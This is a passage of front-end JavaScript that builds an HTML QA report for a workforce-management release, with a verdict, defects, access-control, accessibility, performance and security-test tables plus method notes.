      <div class="meta"><span>${when.toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' })}</span><span>Admin app :3000 · Employee portal :3001 · Gateway :4000</span><span>Branch <code>qa/production-readiness</code></span></div>
    </div>
    <div class="stamp ${D.verdict === 'GO' ? 'go' : D.verdict === 'CONDITIONAL' ? 'cond' : ''}" role="img" aria-label="Release verdict ${D.verdict}"><span>${RT ? 'Re-test verdict' : 'Release verdict'}</span><b>${D.verdict === 'CONDITIONAL' ? 'CONDITIONAL GO' : D.verdict}</b><span>${D.bySev.Critical} critical · ${D.bySev.High} high open</span></div>
  </header>`));

  app.append($(`<section aria-label="Summary" style="gap:18px">
    <p class="lede">${D.verdictLine ? esc(D.verdictLine) : D.verdict === 'GO' ? 'No blocking defects remain.' : `Do not ship yet. Fix the ${blockers.length} critical and high defects below, then re-run the suite. Access control, sign-in protection, scheduling rules and the main self-service flows held up well.`}</p>
    <div class="sevrow">${sevs.map((s) => `<span class="sev s-${s}"><i></i>${D.bySev[s]} ${s.toLowerCase()}${RT ? ' open' : ''}</span>`).join('')}</div>
    <div class="figs">
      <div class="fig"><span class="eyebrow">Screens</span><b class="num">${C.adminScreens + C.portalSections}</b><small>${C.adminScreens} admin + ${C.portalSections} portal, each with a11y scan</small></div>
      <div class="fig"><span class="eyebrow">Access checks</span><b class="num">${n(C.rbacChecks)}</b><small>role × route over ${C.guardedRoutes} guarded API routes · 0 leaks</small></div>
      <div class="fig"><span class="eyebrow">Functional</span><b class="num">${C.functionalPass}/${C.functionalChecks}</b><small>API checks across 8 modules + self-service</small></div>
      <div class="fig"><span class="eyebrow">UI journeys</span><b class="num">${C.uiPass}/${C.uiChecks}</b><small>admin + portal checks in Chrome</small></div>
      <div class="fig"><span class="eyebrow">Security</span><b class="num">${C.securityPass}/${C.securityTests}</b><small>attack tests passed</small></div>
    </div>
    <nav class="toc" aria-label="Sections">${RT ? '<a href="#retest">Re-test</a>' : ''}<a href="#mustfix">Must fix</a><a href="#modules">Modules</a><a href="#defects">All defects</a><a href="#security">Security</a><a href="#access">Access control</a><a href="#a11y">Accessibility</a><a href="#perf">Performance</a><a href="#static">Builds &amp; suites</a><a href="#strengths">What works</a><a href="#method">Method</a></nav>
  </section>`));

  if (RT) {
    const order = ['Fixed', 'Partly fixed', 'Still open', 'Still applies', 'New'];
    const orig = D.defects.filter((d) => d.retest && d.retest.status !== 'New');
    app.append($(`<section id="retest"><div class="sec-head"><div class="eyebrow">Re-test · ${new Date(RT.date).toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' })}</div><h2>What changed since the first run</h2>
      <p>Each of the ${orig.length} original defects was checked again directly against the running stack, alongside a full re-run of the Playwright suite (${RT.suite.passed} of ${RT.suite.total} tests passed). The first run's verdict was ${esc(RT.previousVerdict)} with ${RT.previousCounts.Critical} critical and ${RT.previousCounts.High} high defects.</p></div>
      <div class="rtgrid">${order.filter((k) => RT.counts[k]).map((k) => `<div class="fig"><span class="eyebrow">${k}</span><b class="num ${rtCls(k)}">${RT.counts[k]}</b></div>`).join('')}</div>
      <div class="tbl"><table><thead><tr><th>ID</th><th>Severity</th><th>Defect</th><th>Re-test</th><th>What we saw</th></tr></thead><tbody>
      ${[...D.defects].sort((a, b) => a.id.localeCompare(b.id)).map((d) => `<tr><td class="mono">${d.id}</td><td>${sev(d.sev)}</td><td style="min-width:200px"><b>${esc(d.title)}</b></td><td>${rt(d)}</td><td style="min-width:260px">${esc(d.retest?.note)}</td></tr>`).join('')}
      </tbody></table></div></section>`));
  }

  app.append($(`<section id="mustfix"><div class="sec-head"><div class="eyebrow">Gate</div><h2>${RT ? 'Still blocking launch' : 'Must fix before launch'}</h2><p>${RT ? 'Critical and high defects that are not yet fixed.' : 'Critical and high defects. Each one is reproducible and has a suggested fix in the defect list.'}</p></div>
    <div class="mustfix">${blockers.map((d) => `<div class="mf"><span class="mono">${d.id}</span>${sev(d.sev)}<div style="min-width:0"><div class="t">${esc(d.title)} ${rt(d)}</div><div class="a">${esc(d.area)}${d.retest ? ' · ' + esc(d.retest.note) : ''}</div></div></div>`).join('')}</div></section>`));

  app.append($(`<section id="modules"><div class="sec-head"><div class="eyebrow">Module by module</div><h2>Scorecard</h2><p>Every admin screen was opened by URL and checked for crashes, uncaught errors, failing API calls and WCAG issues. Functional checks drive each module's API end to end.</p></div>
    <div class="tbl"><table><thead><tr><th>Module</th><th class="n">Screens</th><th class="n">Crashes</th><th class="n">5xx</th><th class="n">Avg load</th><th class="n">Functional</th><th>Worst open defect</th><th>Defects</th></tr></thead><tbody>
    ${D.modules.map((m) => `<tr><td><b>${esc(m.name)}</b>${m.maxLoad && m.maxLoad.loadMs > 6000 ? `<div class="note">Slowest: <code>${esc(m.maxLoad.url)}</code> ${n(Math.round(m.maxLoad.loadMs / 100) / 10)} s</div>` : ''}</td><td class="n">${m.screens}</td><td class="n">${m.crashes ? `<span class="bad">${m.crashes}</span>` : '0'}</td><td class="n">${m.serverErrors ? `<span class="bad">${m.serverErrors}</span>` : '0'}</td><td class="n">${m.avgLoadMs ? n(m.avgLoadMs) + ' ms' : '—'}</td><td class="n">${m.fnTotal ? `<span class="${m.fnPass === m.fnTotal ? 'ok' : 'bad'}">${m.fnPass}/${m.fnTotal}</span>` : '—'}</td><td>${m.worst ? sev(m.worst) : '<span class="ok">None</span>'}</td><td class="mono" style="font-size:12px">${m.defects.join(' ') || '—'}</td></tr>`).join('')}
    </tbody></table></div>
    <p class="note">Load times are from Vite dev servers (unbundled modules) and include waiting for every API call to finish. Accessibility defects DEF-05, 06 and 18 apply to all admin modules and are listed once.</p></section>`));

  app.append($(`<section id="defects"><div class="sec-head"><div class="eyebrow">${D.defects.length} found</div><h2>All defects</h2><p>Click a defect for steps, expected and actual results, evidence and the suggested fix. The same list is in <code>qa/reports/defects.csv</code> for import into Jira or Azure DevOps.</p></div>
    <div class="filters" role="group" aria-label="Filter by severity"><button class="chip" aria-pressed="true" data-sev="all" id="f-all">All</button>${sevs.map((s) => `<button class="chip" aria-pressed="false" data-sev="${s}" id="f-${s}">${s} · ${D.bySev[s]}</button>`).join('')}<input class="search" id="dq" type="search" placeholder="Search defects" aria-label="Search defects"></div>
    <div class="defects" id="dlist">${D.defects.map((d) => `<details class="d ${d.sev}" data-sev="${d.sev}" data-q="${esc((d.id + ' ' + d.title + ' ' + d.area + ' ' + d.actual).toLowerCase())}"><summary><span class="mono">${d.id}</span>${sev(d.sev)}<span style="font-weight:600;min-width:0">${esc(d.title)} ${rt(d)}</span><span class="area">${esc(d.area)}</span></summary>
      <dl class="dl">${d.retest ? `<dt>Re-test</dt><dd>${rt(d)} ${esc(d.retest.note)}</dd>` : ''}<dt>Steps</dt><dd>${esc(d.steps)}</dd><dt>Expected</dt><dd>${esc(d.expected)}</dd><dt>Actual</dt><dd>${esc(d.actual)}</dd><dt>Evidence</dt><dd>${esc(d.evidence)}</dd><dt>Fix</dt><dd>${esc(d.fix)}</dd></dl></details>`).join('')}</div></section>`));

  app.append($(`<section id="security"><div class="sec-head"><div class="eyebrow">Attack tests against the live gateway</div><h2>Security</h2></div>
    <div class="tbl"><table><thead><tr><th>Test</th><th>Result</th><th>What was checked</th><th>Evidence</th></tr></thead><tbody>
    ${D.security.map((s) => `<tr><td class="mono">${s.id}</td><td>${okb(s.pass)}</td><td>${esc(s.title)}</td><td class="mono" style="font-size:12px;max-width:440px;overflow-wrap:anywhere">${esc(JSON.stringify(s.evidence).slice(0, 260))}</td></tr>`).join('')}
    </tbody></table></div></section>`));

  const roles = D.rbac.filter((r) => r.check === 'role');
  const unauth = D.rbac.find((r) => r.check === 'unauthenticated');
  app.append($(`<section id="access"><div class="sec-head"><div class="eyebrow">Role-based access control</div><h2>Access control</h2><p>Routes and their required permissions were read from the gateway source (352 routes, 327 guarded). Each role called every route it lacks permission for (must be 403) and every GET it is allowed (must not be 401/403 or 5xx).</p></div>
    <div class="tbl"><table><thead><tr><th>Caller</th><th class="n">Calls</th><th class="n">Leaks</th><th class="n">Wrongly blocked</th><th class="n">5xx</th><th>Result</th></tr></thead><tbody>
    ${unauth ? `<tr><td>Signed out</td><td class="n">${unauth.tested}</td><td class="n">${unauth.leaks.length}</td><td class="n">—</td><td class="n">—</td><td>${okb(!unauth.leaks.length)}</td></tr>` : ''}
    ${roles.map((r) => `<tr><td class="mono">${r.role}</td><td class="n">${r.tested}</td><td class="n">${r.leaks.length}</td><td class="n">${r.wrongDeny.length}</td><td class="n">${r.errors5xx.length}</td><td>${okb(!r.leaks.length && !r.wrongDeny.length && !r.errors5xx.length)}</td></tr>`).join('')}
    </tbody></table></div><p class="note">The WFM_ADMIN role holds every permission, so it has nothing to be denied; it is covered by the functional and crawl runs.</p></section>`));

  app.append($(`<section id="a11y"><div class="sec-head"><div class="eyebrow">axe-core 4 · WCAG 2.1 A and AA</div><h2>Accessibility</h2><p>Automated scan of all ${C.adminScreens} admin screens plus the portal; keyboard reachability tested by hand in Chrome.</p></div>
    <div class="tbl"><table><thead><tr><th>Rule</th><th>Impact</th><th class="n">Screens</th><th class="n">Elements</th><th>Meaning</th></tr></thead><tbody>
    ${D.axe.map((a) => `<tr><td class="mono">${a.id}</td><td>${sev(a.impact === 'critical' ? 'Critical' : a.impact === 'serious' ? 'High' : 'Medium').replace(/>(Critical|High|Medium)</, '>' + a.impact + '<')}</td><td class="n">${a.screens}/${C.adminScreens}</td><td class="n">${n(a.nodes)}</td><td>${esc(a.help)}</td></tr>`).join('')}
    </tbody></table></div></section>`));

  const lat = (D.perf['api-latency'] ?? {}).rows ?? [], con = (D.perf.concurrency ?? {}).rows ?? [], pl = (D.perf['page-load'] ?? {}).rows ?? [];
  const maxP95 = Math.max(1, ...lat.map((r) => r.p95));
  const maxSet = Math.max(1, ...pl.map((r) => r.settledMs));
  app.append($(`<section id="perf"><div class="sec-head"><div class="eyebrow">Baseline on one machine, dev servers</div><h2>Performance</h2><p>Indicative only: a production build behind a real web server will load pages faster, but slow endpoints stay slow.</p></div>
    <div class="two">
      <div class="tbl"><table><thead><tr><th>API read (15 calls each)</th><th class="n">p50</th><th class="n">p95</th><th class="n">Size</th></tr></thead><tbody>
      ${lat.map((r) => `<tr><td class="mono" style="font-size:12px">${esc(r.endpoint)}</td><td class="n">${r.p50} ms</td><td class="n">${r.p95} ms<span class="bar" style="width:${Math.max(2, Math.round((r.p95 / maxP95) * 60))}px"></span></td><td class="n">${r.kb} kB</td></tr>`).join('')}
      </tbody></table></div>
      <div class="tbl"><table><thead><tr><th>Screen</th><th class="n">First paint</th><th class="n">All data loaded</th><th class="n">API calls</th></tr></thead><tbody>
      ${pl.map((r) => `<tr><td class="mono" style="font-size:12px">${esc(r.url)}</td><td class="n">${n(r.loadMs)} ms</td><td class="n">${n(r.settledMs)} ms<span class="bar ${r.settledMs > 10000 ? 'warn' : ''}" style="width:${Math.max(2, Math.round((r.settledMs / maxSet) * 60))}px"></span></td><td class="n">${r.apiCalls}</td></tr>`).join('')}
      </tbody></table></div>
    </div>
    <div class="tbl"><table><thead><tr><th>Concurrency (25 parallel × 4 waves)</th><th class="n">Requests</th><th class="n">Req/s</th><th class="n">p50</th><th class="n">p95</th><th>Status codes</th></tr></thead><tbody>
    ${con.map((r) => `<tr><td class="mono" style="font-size:12px">${esc(r.endpoint)}</td><td class="n">${r.requests}</td><td class="n">${r.rps ?? '—'}</td><td class="n">${r.p50 != null ? r.p50 + ' ms' : '—'}</td><td class="n">${r.p95} ms</td><td class="mono" style="font-size:12px">${esc(JSON.stringify(r.codes))}</td></tr>`).join('')}
    </tbody></table></div>
    <div class="tbl"><table><thead><tr><th>Phone layout (412 px)</th><th class="n">Content width</th><th class="n">Sidebar</th><th>Result</th></tr></thead><tbody>
    ${D.responsive.map((r) => { const v = r.detail.Home ?? r.detail['/overview']; return `<tr><td>${r.app === 'portal' ? 'Employee portal' : 'Admin app'}</td><td class="n">${v.mainW} px</td><td class="n">${v.asideW} px</td><td>${okb(v.mainW >= v.viewW * 0.7, 'Usable', 'Squeezed')}</td></tr>`; }).join('')}
    </tbody></table></div></section>`));

  const gs = D.gatewaySuite;
  app.append($(`<section id="static"><div class="sec-head"><div class="eyebrow">Static checks and the project's own tests</div><h2>Builds &amp; suites</h2></div>
    <div class="tbl"><table><thead><tr><th>Check</th><th>Result</th><th>Detail</th></tr></thead><tbody>
    ${D.staticChecks.map((s) => `<tr><td>${esc(s.name)}</td><td>${okb(s.ok)}</td><td>${esc(s.detail)}</td></tr>`).join('')}
    </tbody></table></div>
    ${gs && gs.failures.length ? `<details class="d Medium"><summary><span class="mono">suite</span>${sev('Medium')}<span style="font-weight:600">Gateway suite: ${gs.fail} failing test${gs.fail === 1 ? '' : 's'}</span><span class="area">backend/gateway/test</span></summary><div class="dl" style="grid-template-columns:1fr"><dd><ul class="list">${gs.failures.map((f) => `<li>${esc(f)}</li>`).join('')}</ul></dd></div></details>` : ''}
  </section>`));

  app.append($(`<section id="strengths"><div class="sec-head"><div class="eyebrow">Keep these</div><h2>What works well</h2></div><ul class="list">${D.strengths.map((s) => `<li>${esc(s)}</li>`).join('')}</ul></section>`));

  app.append($(`<section id="method"><div class="sec-head"><div class="eyebrow">How this was tested</div><h2>Method and limits</h2></div>
    <div class="two">
      <div style="display:grid;gap:10px"><h3>Coverage</h3><ul class="list">
        <li>Manual and exploratory: every screen opened and reviewed in Chrome; findings confirmed by hand before logging.</li>
        <li>Automated UI (Playwright + Chrome): ${C.adminScreens}-screen crawl, admin journeys, portal journeys, phone layout.</li>
        <li>API: functional checks per module, role-based access over every guarded route, attack tests.</li>
        <li>AI-assisted: route inventory and permission map generated from the gateway source; defect triage and root cause read from code.</li>
        <li>Performance baseline, production builds, type checks, the engine's and the gateway's own test suites.</li>
      </ul></div>
      <div style="display:grid;gap:10px"><h3>Not covered</h3><ul class="list">
        <li>Second tenant: row-level security is on, but cross-tenant isolation was not tested with two organisations.</li>
        <li>Single sign-on, SCIM provisioning, e-mail/SMS delivery, webhooks and the native mobile app.</li>
        <li>Production infrastructure: TLS, reverse proxy, backups, load beyond 25 concurrent requests.</li>
        <li>Browsers other than Chrome; screen-reader walkthrough.</li>
      </ul></div>

<pre>cd qa
npm install
$env:QA_ADMIN_PASSWORD='…'          # test stack only — the suite creates QA- data

node tools/build-report.mjs          # rebuild this report into qa/reports</pre>
    <p class="note">Environment: ${esc(D.environment.branch)}. Browser: ${esc(D.environment.browser)}. Data created by the run is named <code>QA-…</code>, <code>qa.*</code> users and the "Demo Support" group.</p>
  </section>`));

  // filters
  const chips = [...document.querySelectorAll('.chip')], q = document.getElementById('dq');
  let active = 'all';
  const apply = () => { const t = q.value.trim().toLowerCase(); document.querySelectorAll('#dlist details').forEach((d) => { d.hidden = !((active === 'all' || d.dataset.sev === active) && (!t || d.dataset.q.includes(t))); }); };
  chips.forEach((c) => c.addEventListener('click', () => { active = c.dataset.sev; chips.forEach((x) => x.setAttribute('aria-pressed', String(x === c))); apply(); }));
  q.addEventListener('input', apply);
  const h = location.hash.slice(1); if (h) document.getElementById(h)?.scrollIntoView();
})();
